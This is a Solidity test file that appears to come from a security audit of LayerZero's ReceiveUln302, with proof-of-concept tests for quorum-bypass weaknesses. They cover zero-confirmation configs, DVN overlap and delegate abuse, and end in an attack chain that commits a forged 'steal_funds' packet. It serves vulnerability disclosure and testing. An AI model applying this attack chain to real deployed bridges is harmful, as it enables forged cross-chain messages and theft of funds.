// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import { Origin } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroEndpointV2.sol";
import { SetConfigParam } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/IMessageLibManager.sol";
import { Packet } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ISendLib.sol";
import { PacketV1Codec } from "@layerzerolabs/lz-evm-protocol-v2/contracts/messagelib/libs/PacketV1Codec.sol";

import { ReceiveUln302 } from "../../contracts/uln/uln302/ReceiveUln302.sol";
import { UlnConfig, SetDefaultUlnConfigParam } from "../../contracts/uln/UlnBase.sol";
import { Constant } from "../util/Constant.sol";
import { PacketUtil } from "../util/Packet.sol";
import { AuditBase } from "./AuditBase.t.sol";

contract QuorumBypassTest is AuditBase {
    uint64 internal constant NIL_CONFIRMATIONS = type(uint64).max;
    uint8 internal constant NIL_DVN_COUNT = type(uint8).max;
    uint32 internal constant CONFIG_TYPE_ULN = 2;

    // ==================== AV1.1: Zero DVN Config Should Revert ====================
    function test_AV1_1_ZeroDVNConfig_ShouldRevert() public {
        // Setting 0 required DVNs and 0 optional threshold should revert
        address[] memory emptyDVNs = new address[](0);
        UlnConfig memory badConfig = UlnConfig({
            confirmations: 1,
            requiredDVNCount: 0,
            optionalDVNCount: 0,
            optionalDVNThreshold: 0,
            requiredDVNs: emptyDVNs,
            optionalDVNs: emptyDVNs
        });
        SetDefaultUlnConfigParam[] memory params = new SetDefaultUlnConfigParam[](1);
        params[0] = SetDefaultUlnConfigParam(SRC_EID, badConfig);

        vm.expectRevert(); // LZ_ULN_AtLeastOneDVN
        dstReceiveUln.setDefaultUlnConfigs(params);
    }

    // ==================== AV1.2: NIL_CONFIRMATIONS Resolves to Zero ====================
    /// @dev CRITICAL: Setting confirmations = NIL_CONFIRMATIONS (type(uint64).max)
    ///      causes resolved config to have confirmations = 0
    ///      This means ANY submitted DVN verification passes regardless of actual confirmations
    function test_AV1_2_NilConfirmationsResolvesToZero() public {
        // The default config has confirmations=1 (set in wireFixtureV2WithRemote)
        UlnConfig memory defaultCfg = dstReceiveUln.getUlnConfig(address(0), SRC_EID);
        assertEq(defaultCfg.confirmations, 1, "Default confirmations should be 1");

        // OApp sets its own config with NIL_CONFIRMATIONS
        address oapp = address(this); // test contract is the OApp
        address[] memory dvns = new address[](1);
        dvns[0] = address(dstDvn);

        UlnConfig memory oappConfig = UlnConfig({
            confirmations: NIL_CONFIRMATIONS, // type(uint64).max
            requiredDVNCount: 1,
            optionalDVNCount: 0,
            optionalDVNThreshold: 0,
            requiredDVNs: dvns,
            optionalDVNs: new address[](0)
        });

        // Set via endpoint (test contract is the OApp, so it's authorized)
        bytes memory configBytes = abi.encode(oappConfig);
        SetConfigParam[] memory cfgParams = new SetConfigParam[](1);
        cfgParams[0] = SetConfigParam({
            eid: SRC_EID,
            configType: CONFIG_TYPE_ULN,
            config: configBytes
        });
        dstEndpoint.setConfig(oapp, address(dstReceiveUln), cfgParams);

        // Read back the resolved config
        UlnConfig memory resolved = dstReceiveUln.getUlnConfig(oapp, SRC_EID);

        // CRITICAL: confirmations resolves to 0!
        assertEq(resolved.confirmations, 0, "NIL_CONFIRMATIONS should resolve to 0");
        emit log("CONFIRMED: NIL_CONFIRMATIONS resolves to 0 confirmations");
        emit log("Any DVN verification with any confirmation count (including 0) will pass");
    }

    // ==================== AV1.3: Zero Confirmations Allows Instant Verification ====================
    /// @dev When confirmations = 0, DVN can verify with 0 confirmations and packet is verifiable
    function test_AV1_3_ZeroConfirmationsAllowsInstantVerification() public {
        // Set OApp config with NIL_CONFIRMATIONS -> resolves to 0
        address oapp = address(this);
        address[] memory dvns = new address[](1);
        dvns[0] = address(dstDvn);

        UlnConfig memory oappConfig = UlnConfig({
            confirmations: NIL_CONFIRMATIONS,
            requiredDVNCount: 1,
            optionalDVNCount: 0,
            optionalDVNThreshold: 0,
            requiredDVNs: dvns,
            optionalDVNs: new address[](0)
        });

        bytes memory configBytes = abi.encode(oappConfig);
        SetConfigParam[] memory cfgParams = new SetConfigParam[](1);
        cfgParams[0] = SetConfigParam({
            eid: SRC_EID,
            configType: CONFIG_TYPE_ULN,
            config: configBytes
        });
        dstEndpoint.setConfig(oapp, address(dstReceiveUln), cfgParams);

        // Create a packet
        Packet memory packet = _makePacket(1, address(this), address(this), "test");
        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(packet);

        // DVN verifies with 0 confirmations (no block finality proof!)
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 0);

        // Check if verifiable -- should be TRUE because 0 >= 0
        UlnConfig memory resolved = dstReceiveUln.getUlnConfig(oapp, SRC_EID);
        bytes32 headerHash = keccak256(header);
        bool isVerifiable = dstReceiveUln.verifiable(resolved, headerHash, payloadHash);

        assertTrue(isVerifiable, "Packet should be verifiable with 0 confirmations when config has 0");

        // Commit verification -- should succeed
        _commitVerification(dstReceiveUln, header, payloadHash);

        emit log("CONFIRMED: Zero-confirmation verification succeeds");
        emit log("DVN can verify message instantly without any block finality proof");
    }

    // ==================== AV1.4: DVN Overlap Required/Optional ====================
    /// @dev Same DVN in both required and optional lists means effective quorum is 1
    function test_AV1_4_DVNOverlapRequiredOptional() public {
        address oapp = address(this);
        address[] memory reqDvns = new address[](1);
        reqDvns[0] = address(dstDvn);
        address[] memory optDvns = new address[](1);
        optDvns[0] = address(dstDvn); // same DVN!

        UlnConfig memory config = UlnConfig({
            confirmations: 1,
            requiredDVNCount: 1,
            optionalDVNCount: 1,
            optionalDVNThreshold: 1,
            requiredDVNs: reqDvns,
            optionalDVNs: optDvns
        });

        bytes memory configBytes = abi.encode(config);
        SetConfigParam[] memory cfgParams = new SetConfigParam[](1);
        cfgParams[0] = SetConfigParam({
            eid: SRC_EID,
            configType: CONFIG_TYPE_ULN,
            config: configBytes
        });
        dstEndpoint.setConfig(oapp, address(dstReceiveUln), cfgParams);

        // Create and verify a packet with just the one DVN
        Packet memory packet = _makePacket(1, address(this), address(this), "overlap");
        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(packet);

        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 1);

        // Single DVN satisfies BOTH required and optional -- effective quorum is 1
        UlnConfig memory resolved = dstReceiveUln.getUlnConfig(oapp, SRC_EID);
        bool isVerifiable = dstReceiveUln.verifiable(resolved, keccak256(header), payloadHash);
        assertTrue(isVerifiable, "Single DVN satisfies both required and optional checks");

        emit log("CONFIRMED: DVN overlap reduces effective quorum to 1");
    }

    // ==================== AV1.5: Delegate Sets NIL_CONFIRMATIONS ====================
    /// @dev A delegate can weaken OApp security by setting NIL_CONFIRMATIONS
    function test_AV1_5_DelegateSetsNilConfirmations() public {
        address oappOwner = address(0x0A99);
        address delegate = address(0xDE1E6A7E);

        // OApp owner sets a delegate
        vm.prank(oappOwner);
        dstEndpoint.setDelegate(delegate);
        assertEq(dstEndpoint.delegates(oappOwner), delegate);

        // Delegate sets NIL_CONFIRMATIONS on behalf of OApp
        address[] memory dvns = new address[](1);
        dvns[0] = address(dstDvn);

        UlnConfig memory weakConfig = UlnConfig({
            confirmations: NIL_CONFIRMATIONS,
            requiredDVNCount: 1,
            optionalDVNCount: 0,
            optionalDVNThreshold: 0,
            requiredDVNs: dvns,
            optionalDVNs: new address[](0)
        });

        bytes memory configBytes = abi.encode(weakConfig);
        SetConfigParam[] memory cfgParams = new SetConfigParam[](1);
        cfgParams[0] = SetConfigParam({
            eid: SRC_EID,
            configType: CONFIG_TYPE_ULN,
            config: configBytes
        });

        // Delegate calls setConfig on behalf of oappOwner
        vm.prank(delegate);
        dstEndpoint.setConfig(oappOwner, address(dstReceiveUln), cfgParams);

        // Verify: OApp now has 0 confirmations
        UlnConfig memory resolved = dstReceiveUln.getUlnConfig(oappOwner, SRC_EID);
        assertEq(resolved.confirmations, 0, "Delegate weakened OApp to 0 confirmations");

        emit log("CONFIRMED: Delegate can set NIL_CONFIRMATIONS on OApp's behalf");
        emit log("This weakens the OApp's security to accept unfinalized messages");
    }

    // ==================== AV1.6: NIL_CONFIRMATIONS Not Blocked for OApp Configs ====================
    /// @dev Default config blocks NIL_CONFIRMATIONS, but OApp config does NOT
    function test_AV1_6_NilConfirmationsBlockedForDefaultOnly() public {
        // Default config: NIL_CONFIRMATIONS should be rejected
        address[] memory dvns = new address[](1);
        dvns[0] = address(dstDvn);

        UlnConfig memory defaultBadConfig = UlnConfig({
            confirmations: NIL_CONFIRMATIONS,
            requiredDVNCount: 1,
            optionalDVNCount: 0,
            optionalDVNThreshold: 0,
            requiredDVNs: dvns,
            optionalDVNs: new address[](0)
        });

        SetDefaultUlnConfigParam[] memory defaultParams = new SetDefaultUlnConfigParam[](1);
        defaultParams[0] = SetDefaultUlnConfigParam(SRC_EID, defaultBadConfig);

        vm.expectRevert(); // LZ_ULN_InvalidConfirmations
        dstReceiveUln.setDefaultUlnConfigs(defaultParams);

        // OApp config: NIL_CONFIRMATIONS is ALLOWED (no validation!)
        bytes memory configBytes = abi.encode(defaultBadConfig);
        SetConfigParam[] memory cfgParams = new SetConfigParam[](1);
        cfgParams[0] = SetConfigParam({
            eid: SRC_EID,
            configType: CONFIG_TYPE_ULN,
            config: configBytes
        });

        // This should SUCCEED -- no validation for OApp configs
        dstEndpoint.setConfig(address(this), address(dstReceiveUln), cfgParams);

        UlnConfig memory resolved = dstReceiveUln.getUlnConfig(address(this), SRC_EID);
        assertEq(resolved.confirmations, 0, "OApp config allows NIL_CONFIRMATIONS (resolves to 0)");

        emit log("CONFIRMED: NIL_CONFIRMATIONS blocked for default but ALLOWED for OApp configs");
        emit log("This asymmetry means any OApp/delegate can zero out confirmations");
    }

    // ==================== AV1.7: Full Attack Chain -- Delegate + Zero Confirmations + Verification ====================
    /// @dev End-to-end: compromised delegate zeros confirmations, then DVN verifies fraudulent message
    function test_AV1_7_FullAttackChain_DelegateZeroConfirmations() public {
        // Use address(this) as the OApp (it implements allowInitializePath)
        // Set up a malicious delegate for this contract
        address maliciousDelegate = address(0xEE1E);

        // Step 1: OApp (this contract) sets delegate
        dstEndpoint.setDelegate(maliciousDelegate);

        // Step 2: Malicious delegate weakens security to zero confirmations
        address[] memory dvns = new address[](1);
        dvns[0] = address(dstDvn);

        UlnConfig memory weakConfig = UlnConfig({
            confirmations: NIL_CONFIRMATIONS,
            requiredDVNCount: 1,
            optionalDVNCount: 0,
            optionalDVNThreshold: 0,
            requiredDVNs: dvns,
            optionalDVNs: new address[](0)
        });

        bytes memory configBytes = abi.encode(weakConfig);
        SetConfigParam[] memory cfgParams = new SetConfigParam[](1);
        cfgParams[0] = SetConfigParam({
            eid: SRC_EID,
            configType: CONFIG_TYPE_ULN,
            config: configBytes
        });

        vm.prank(maliciousDelegate);
        dstEndpoint.setConfig(address(this), address(dstReceiveUln), cfgParams);

        // Verify config was weakened
        UlnConfig memory resolved = dstReceiveUln.getUlnConfig(address(this), SRC_EID);
        assertEq(resolved.confirmations, 0, "Delegate successfully zeroed confirmations");

        // Step 3: Create a "fraudulent" packet targeting this OApp
        // In real scenario, this message was never actually sent on source chain
        Packet memory fraudPacket = PacketUtil.newPacket(
            1, SRC_EID, address(0xFA4E), DST_EID, address(this), "steal_funds"
        );
        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(fraudPacket);

        // Step 4: DVN verifies with 0 confirmations (no block finality proof!)
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 0);

        // Step 5: Verify the fraudulent packet is verifiable
        bool isVerifiable = dstReceiveUln.verifiable(resolved, keccak256(header), payloadHash);
        assertTrue(isVerifiable, "Fraudulent packet verifiable with zero confirmations");

        // Step 6: Commit -- pushes to endpoint
        _commitVerification(dstReceiveUln, header, payloadHash);

        emit log("CONFIRMED: Full attack chain successful");
        emit log("1. Delegate compromised -> 2. Zeros confirmations -> 3. DVN verifies with 0 -> 4. Fraud committed");
    }

    // ==================== Helpers ====================
    function allowInitializePath(Origin calldata) external pure override returns (bool) {
        return true;
    }
}
